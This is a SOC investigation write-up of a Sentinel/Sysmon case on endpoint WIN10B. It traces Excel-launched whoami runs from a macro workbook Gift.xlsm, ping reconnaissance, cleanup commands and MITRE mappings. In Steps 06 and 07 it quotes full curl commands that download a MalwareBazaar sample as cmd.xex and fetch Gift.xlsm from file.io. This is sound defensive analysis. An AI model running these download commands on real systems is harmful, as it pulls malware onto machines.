# Sentinel Sysmon Discovery

This chapter investigates the Microsoft Sentinel incident/rule `New Discovery Command Detected` on Windows endpoint `WIN10B`. The first signal is `whoami` in Sysmon telemetry, but the case becomes stronger when parent processes, process IDs, command lines, user context, downloads, and cleanup activity are correlated.

## Technical Context

`whoami` is legitimate, but it becomes suspicious when launched from Office documents or near downloads and reconnaissance because attackers often check user context before continuing. Sysmon records detailed Windows endpoint events such as process creation and command lines, while Sentinel makes that telemetry searchable with KQL.

> The case is not built on `whoami.exe` being malicious. The case is built on how, when, and from where `whoami.exe` was launched.

**Implemented controls and analysis actions:**

- Reviewed the Sentinel incident/rule `New Discovery Command Detected`.
- Queried Sysmon Event ID 1 process-creation telemetry for `whoami`.
- Compared command lines, parent processes, process IDs, users, and timestamps.
- Expanded the timeline to include `Gift.xlsm`, `curl`, `ping`, cleanup utilities, and elevated installer context.
- Documented evidence limits around macro code, payload execution, credential theft, persistence, and lateral movement.

## Key Technical Terms

| Term | Meaning in this chapter |
|------|-------------------------|
| Sysmon Event ID 1 | Process creation telemetry showing process image, command line, user, parent process, and process IDs. |
| Parent process | The process that launched another process; important for identifying Office-spawned commands. |
| `whoami` | A Windows command that prints current user context; suspicious here because Excel launches it repeatedly. |
| `.xlsm` | Macro-enabled Excel workbook format capable of containing VBA macros. |
| `curl -o` | Command-line file transfer syntax that downloads remote content and saves it to a specified local filename. |

---

## Detailed Walkthrough

### Step 01 - Search Sysmon process telemetry for `whoami`

The investigation starts with the KQL query from the prompt. It searches the `Sysmon` table for events where the `CommandLine` field contains `whoami`.

> This query is a discovery-command pivot: it does not prove malicious behavior by itself, but it quickly finds process events where a user, script, macro, or attacker checked the current account context.

```kql
Sysmon
| where CommandLine contains "whoami"
```

![Sentinel query for whoami activity](../../images/03-sentinel-sysmon/sentinel-kql-whoami-results.png)

<p><sub><strong>Screenshot 015 - Sentinel query for whoami activity:</strong> The Sentinel result shows multiple Sysmon process creation events where the command line contains `whoami`.</sub></p>

Each result has `EventID=1`, Sysmon's process-creation event, so these are actual process executions with command-line and parent-process context.

---

### Step 02 - Reconstruct the `whoami` execution records

The four `whoami.exe` records show the timeline changing from a normal `cmd.exe` parent to repeated Excel-driven execution. This step preserves the key fields that matter for process analysis: time, user, image, command line, process ID, parent image, parent command line, and parent process ID.

> A command name alone is not enough for a verdict. In Sysmon, the value comes from comparing `Image`, `CommandLine`, `ProcessId`, `ParentImage`, `ParentCommandLine`, `ParentProcessId`, user, and time.

#### Event 01 - Baseline Command Prompt Execution

```text
TimeGenerated UTC : 5/7/2024 7:50:04.820 AM
Source            : Microsoft-Windows-Sysmon
EventID           : 1 - Process Create
User              : WIN10B\Jim
Image             : C:\Windows\System32\whoami.exe
CommandLine       : whoami
ProcessId         : 6972
ParentImage       : C:\Windows\System32\cmd.exe
ParentCommandLine : "C:\Windows\system32\cmd.exe"
ParentProcessId   : 4836
```

#### Event 02 - Excel Launches Identity Discovery

```text
TimeGenerated UTC : 5/7/2024 12:14:39.812 PM
Source            : Microsoft-Windows-Sysmon
EventID           : 1 - Process Create
User              : WIN10B\Jim
Image             : C:\Windows\System32\whoami.exe
CommandLine       : whoami
ProcessId         : 3344
ParentImage       : C:\Program Files\Microsoft Office\Root\Office16\EXCEL.EXE
ParentCommandLine : "C:\Program Files\Microsoft Office\Root\Office16\EXCEL.EXE" "C:\Users\Jim.WIN10B\Desktop\Gift.xlsm"
ParentProcessId   : 9164
```

#### Event 03 - Repeated Discovery from the Same Excel Process

```text
TimeGenerated UTC : 5/7/2024 12:14:55.257 PM
Source            : Microsoft-Windows-Sysmon
EventID           : 1 - Process Create
User              : WIN10B\Jim
Image             : C:\Windows\System32\whoami.exe
CommandLine       : whoami
ProcessId         : 8388
ParentImage       : C:\Program Files\Microsoft Office\Root\Office16\EXCEL.EXE
ParentCommandLine : "C:\Program Files\Microsoft Office\Root\Office16\EXCEL.EXE" "C:\Users\Jim.WIN10B\Desktop\Gift.xlsm"
ParentProcessId   : 9164
```

#### Event 04 - Later Excel Process Repeats the Pattern

```text
TimeGenerated UTC : 5/7/2024 12:38:03.237 PM
Source            : Microsoft-Windows-Sysmon
EventID           : 1 - Process Create
User              : WIN10B\Jim
Image             : C:\Windows\System32\whoami.exe
CommandLine       : whoami
ProcessId         : 5792
ParentImage       : C:\Program Files\Microsoft Office\Root\Office16\EXCEL.EXE
ParentCommandLine : "C:\Program Files\Microsoft Office\Root\Office16\EXCEL.EXE" "C:\Users\Jim.WIN10B\Desktop\Gift.xlsm"
ParentProcessId   : 2852
```

The first event can be normal manual command-line use. The later events change the verdict because Excel launches `whoami.exe` and the parent command line points to `Gift.xlsm`.

---

### Step 03 - Compare process IDs, timing, and parent process context

The process IDs confirm that Sentinel is showing four separate `whoami.exe` executions: `6972`, `3344`, `8388`, and `5792`. The parent process is the key difference: the first event comes from `cmd.exe`, while later events come from `EXCEL.EXE`.

> Office applications launching discovery commands require closer review because malicious macros often run built-in commands to learn user, host, and network context.

![Changing whoami process IDs](../../images/03-sentinel-sysmon/changing-whoami-process-ids.png)

<p><sub><strong>Screenshot 016 - Changing process IDs:</strong> The repeated `whoami` executions use different process IDs, showing multiple executions rather than one static event.</sub></p>

![Excel parent process and repeated timestamps](../../images/03-sentinel-sysmon/excel-parent-process-and-event-times.png)

<p><sub><strong>Screenshot 017 - Excel parent process and parent command line:</strong> The screenshot shows `EXCEL.EXE` as the parent process and `C:\Users\Jim.WIN10B\Desktop\Gift.xlsm` in the parent command line.</sub></p>

![Timestamp sequence for repeated whoami executions](../../images/03-sentinel-sysmon/whoami-event-time-sequence.png)

<p><sub><strong>Screenshot 018 - Repeated whoami time sequence:</strong> Three suspicious `whoami` executions occur around 12:14 PM and 12:38 PM after the earlier baseline event.</sub></p>

The later Excel-linked events support repeated discovery tied to `Gift.xlsm`, especially because two executions share `ParentProcessId=9164` and a later one uses `2852`.

---

### Step 04 - Check elevated context and cleanup activity

After the `whoami` events were confirmed, the investigation expanded beyond the initial command. This step checks whether the same wider timeline includes elevated execution or cleanup-related activity that could affect forensic visibility.

> Cleanup tools are not automatically malicious. They matter because evidence preservation should happen before cleanup or remediation changes the endpoint state.

![Elevated command context](../../images/03-sentinel-sysmon/elevated-command-context.png)

<p><sub><strong>Screenshot 019 - Elevated command context:</strong> The command line shows `C:\Users\Jim.WIN10B\Downloads\OfficeSetup.exe` with an `ELEVATED` context and a user SID.</sub></p>

`OfficeSetup.exe` is not automatically malicious. The important point is that it appears as an elevated process from the user's Downloads folder, so the file source, hash, signature, and execution time should be reviewed.

![OneDrive update command](../../images/03-sentinel-sysmon/onedrive-update-command.png)

<p><sub><strong>Screenshot 020 - OneDrive-related command:</strong> The command uses `cmd.exe /q /c del /q` to delete `C:\Users\Jim.WIN10B\AppData\Local\Microsoft\OneDrive\Update\OneDriveSetup.exe`.</sub></p>

The command deletes `OneDriveSetup.exe` from the user's profile. This can be legitimate updater cleanup, but it still belongs in the timeline because it is a file deletion executed through `cmd.exe`.

![Cleanmgr autoclean command](../../images/03-sentinel-sysmon/cleanmgr-autoclean-command.png)

<p><sub><strong>Screenshot 021 - Cleanmgr autoclean command:</strong> The command shows `C:\Windows\System32\cleanmgr.exe /autoclean /d C:`, which is a cleanup action against the C drive.</sub></p>

`cleanmgr.exe /autoclean /d C:` is a Windows cleanup utility command. It does not prove evasion, but it can affect forensic visibility.

![CCleaner and Office process activity](../../images/03-sentinel-sysmon/ccleaner-and-office-processes.png)

<p><sub><strong>Screenshot 022 - CCleaner and Office process activity:</strong> The process list includes `CCleaner64.exe /MONITOR`, `CCleaner.exe /MONITOR /uac`, Microsoft Edge subprocesses, and Office activity.</sub></p>

The cleanup items do not prove evasion. They explain why evidence preservation should happen before additional cleanup or remediation.

---

### Step 05 - Review internal reachability checks

The next topic is discovery. `ping` checks whether internal hosts are reachable. Attackers often use simple built-in tools first because they are already present on Windows and usually blend into normal command-line activity.

> The concern is the sequence, not one command: Excel opens `Gift.xlsm`, `whoami` runs from Excel, internal systems are checked, and external files are downloaded with command-line tools.

```text
ping dc
ping 10.10.10.10
ping dc.local.course
whoami
```

![Recon and process timeline](../../images/03-sentinel-sysmon/recon-and-process-timeline.png)

<p><sub><strong>Screenshot 023 - Recon and process timeline:</strong> The timeline shows `ping dc`, `ping 10.10.10.10`, `ping dc.local.course`, and `whoami` launched from `cmd.exe`.</sub></p>

`dc`, `dc.local.course`, and `10.10.10.10` point to domain-controller or internal network reachability checks. This does not prove lateral movement, but it does show discovery behavior near the suspicious `whoami` activity.

---

### Step 06 - Review external file-transfer commands

The next topic is external transfer. `curl -o` downloads remote content and writes it to a local filename chosen by the command. On a user endpoint, this is high-signal when the source is malware-sharing infrastructure or temporary hosting.

> MalwareBazaar is a legitimate malware-research platform, but a normal user endpoint downloading from its `/download/` path should be treated as high-risk until proven benign.

```text
curl -o cmd.xex https://bazaar.abuse.ch/download/69583b9a85076bf1690ef00fceeb77ac998a991375d8ee809ec2fa037f09f3e4/
```

![Curl download and ping activity](../../images/03-sentinel-sysmon/curl-download-and-ping-activity.png)

<p><sub><strong>Screenshot 024 - Curl download and ping activity:</strong> The command evidence includes `curl -o cmd.xex` downloading from `bazaar.abuse.ch`, plus surrounding command-line activity.</sub></p>

The command saves the result as `cmd.xex`, a name that looks close to trusted `cmd.exe`. This maps to [T1105 - Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105/) and resembles [T1036 - Masquerading](https://attack.mitre.org/techniques/T1036/).

![VirusTotal detection for bazaar.abuse.ch](../../images/03-sentinel-sysmon/virustotal-bazaar-abuse-domain-detection.png)

<p><sub><strong>Screenshot 025 - VirusTotal domain detection for bazaar.abuse.ch:</strong> VirusTotal shows the `bazaar.abuse.ch` domain with a low vendor-detection count, while the community context still treats it as malware-related infrastructure.</sub></p>

The stronger signal is behavioral, not the vendor count: `curl` pulls a `/download/` URL and saves it as an executable-looking file. File collection and execution telemetry are still needed to prove whether `cmd.xex` downloaded successfully or executed.

---

### Step 07 - Investigate `Gift.xlsm` as the central artifact

`Gift.xlsm` is the key artifact because it appears beside `whoami`, internal checks, `curl` downloads, and cleanup. The `.xlsm` extension means the workbook can contain VBA macros.

> `file.io` is not the verdict. The suspicious behavior is a macro-enabled Office file coming from temporary hosting and then appearing in process telemetry tied to discovery commands.

```text
curl -o Gift.xlsm https://file.io/atAOsYothaq0
```

![Repeated Gift.xlsm downloads](../../images/03-sentinel-sysmon/repeated-gift-xlsm-downloads.png)

<p><sub><strong>Screenshot 026 - Repeated Gift.xlsm downloads:</strong> The screenshot shows repeated `curl` downloads associated with `Gift.xlsm`.</sub></p>

This command downloads `Gift.xlsm` from `file.io`, a temporary file-sharing service. The risk is the combination: a macro-enabled workbook is retrieved from temporary hosting and then appears in the same case as Excel-launched discovery.

![VirusTotal community context for file.io](../../images/03-sentinel-sysmon/virustotal-file-io-community-context.png)

<p><sub><strong>Screenshot 027 - VirusTotal community context for file.io:</strong> The community notes describe `file.io` as not necessarily malicious by itself, but also mention its use as a payload-hosting or downloader location in real threat-reporting context.</sub></p>

VirusTotal community notes connect `file.io` with payload distribution in some malware and intrusion reporting. In this case it is best treated as possible delivery or staging infrastructure because the downloaded object is a macro-enabled workbook.

---

### Step 08 - Link Excel execution back to discovery

The final timeline step ties `Gift.xlsm` back to Excel execution and repeated `whoami`. This is the strongest behavioral link because the workbook appears as both an executed Office document and a later `curl` download.

> `splwow64.exe` is a legitimate Windows print-support process, so it should not distract from the main chain: macro-enabled workbook, Excel parent process, discovery commands, internal checks, and external transfers.

![Gift.xlsm Excel execution timeline](../../images/03-sentinel-sysmon/gift-xlsm-excel-execution-timeline.png)

<p><sub><strong>Screenshot 028 - Gift.xlsm Excel execution timeline:</strong> Excel opens `C:\Users\Jim.WIN10B\Desktop\Gift.xlsm` multiple times around 8:32 AM, 8:51 AM, and 8:52 AM.</sub></p>

Jim's endpoint opens the workbook several times from the user desktop. Repeated openings can be normal if a user is working with a file, but in this case the workbook appears near Excel-launched `whoami`, internal checks, and downloads.

![Extended Gift.xlsm timeline](../../images/03-sentinel-sysmon/extended-gift-xlsm-timeline.png)

<p><sub><strong>Screenshot 029 - Extended Gift.xlsm timeline:</strong> The extended view shows more Excel executions of `Gift.xlsm` around 9:02 AM and 9:03 AM, followed by repeated `curl -o Gift.xlsm` downloads around 12:07 PM.</sub></p>

The extended timeline shows the workbook repeatedly across the user's activity and should be treated as the main file to collect and inspect.

![Combined whoami and Gift.xlsm timeline](../../images/03-sentinel-sysmon/combined-whoami-gift-timeline.png)

<p><sub><strong>Screenshot 030 - Combined whoami and Gift.xlsm timeline:</strong> The combined timeline links Excel opening `Gift.xlsm`, `splwow64.exe`, repeated `whoami`, and later Excel execution of the same workbook.</sub></p>

| Topic | What was observed | Why it matters |
|-------|-------------------|----------------|
| User discovery | `whoami.exe` runs multiple times, including from Excel. | Identifies the active user context and maps to [T1033 - System Owner/User Discovery](https://attack.mitre.org/techniques/T1033/). |
| Suspicious parent process | `EXCEL.EXE` opens `Gift.xlsm` and launches `whoami.exe`. | Office spawning command-line discovery is suspicious, especially with a macro-enabled workbook. |
| Internal discovery | `ping dc`, `ping 10.10.10.10`, and `ping dc.local.course`. | Checks reachability of likely internal/domain systems and maps to discovery behavior. |
| External transfer | `curl -o cmd.xex` from `bazaar.abuse.ch`. | Downloads a file from malware-research infrastructure and saves it with an executable-like name. |
| Workbook staging | `curl -o Gift.xlsm` from `file.io`. | Shows a macro-enabled workbook retrieved from temporary file hosting. |
| Cleanup context | OneDrive setup deletion, `cleanmgr`, and CCleaner monitor activity. | Does not prove evasion, but supports preserving evidence before remediation. |

`Gift.xlsm` should be treated as the likely central execution or staging artifact until the workbook, macros, hashes, and sandbox behavior are collected.

---

### Step 09 - Case report and response guidance

The conclusion is behavioral, not file-reputation based. Excel and `Gift.xlsm` appear in a suspicious chain with user discovery, internal reachability checks, external downloads, and cleanup-related activity.

> Full compromise is not proven from the available evidence. The case is still high priority because the process chain and downloads are suspicious enough to justify containment and forensic review.

| Field | Assessment |
|-------|------------|
| Verdict | True positive suspicious endpoint activity. |
| Attack status | Credible endpoint incident requiring containment and forensic review; full compromise is not proven from the available evidence. |
| Key evidence | `WIN10B\Jim` opens `Gift.xlsm`; Excel is tied to repeated `whoami`; the timeline includes `file.io` workbook downloads, `cmd.xex` download activity from `bazaar.abuse.ch`, domain-controller checks, and cleanup-related commands. |
| Kill Chain and MITRE | Delivery, execution, and discovery. Main mappings: [T1204.002 - Malicious File](https://attack.mitre.org/techniques/T1204/002/), [T1033 - System Owner/User Discovery](https://attack.mitre.org/techniques/T1033/), [T1105 - Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105/), [T1036 - Masquerading](https://attack.mitre.org/techniques/T1036/), and [T1018 - Remote System Discovery](https://attack.mitre.org/techniques/T1018/). |
| Evidence limits | The original `Gift.xlsm`, macro code, workbook hash, sandbox output, `cmd.xex` hash, payload execution, credential theft, persistence, and lateral movement are not confirmed. |
| Next checks | Isolate `WIN10B`, preserve Sysmon logs, collect `Gift.xlsm` and any `cmd.xex` copy, inspect macros, review DNS/proxy/firewall logs for `file.io` and `bazaar.abuse.ch`, search for the same process chain across endpoints, and interview Jim about the file source. |
| Recommendation | Treat as a high-priority endpoint investigation, preserve evidence before cleanup, harden Office macro controls, and alert on Office-spawned commands, temporary-hosting downloads, and repeated discovery commands. |

This case should be handled as a credible endpoint incident while preserving the distinction between suspicious behavior and unproven compromise outcomes.

---

## Validation and Summary

Sentinel/Sysmon evidence confirms four `whoami.exe` process-creation events, Excel parent-process context, `Gift.xlsm`, changed process IDs, repeated `file.io` workbook downloads, MalwareBazaar context, domain-controller ping checks, elevated installer context, and cleanup-related behavior.

---

## Project Chapters

| # | Chapter | Description |
|---|---------|-------------|
| 0 | [Project Overview](../../README.md) | Main project overview, objectives, tools, and skills. |
| 1 | [FortiGate Command Injection](../01-fortigate-command-injection/README.md) | Inbound HTTP command-injection attempt, payload host enrichment, Mirai context, and server-side validation limits. |
| 2 | [Quishing Email Analysis](../02-quishing-email-analysis/README.md) | QR email triage, sender review, decoded destination, VirtualBox sandbox validation, and PCAP evidence. |
| 3 | [Sentinel Sysmon Discovery](README.md) | Sentinel/Sysmon discovery activity, process timelines, downloads, and response guidance. |
| 4 | [Final Summary](../04-final-summary/README.md) | Final verdicts, validation summary, recommendations, skills, and remaining evidence limits. |
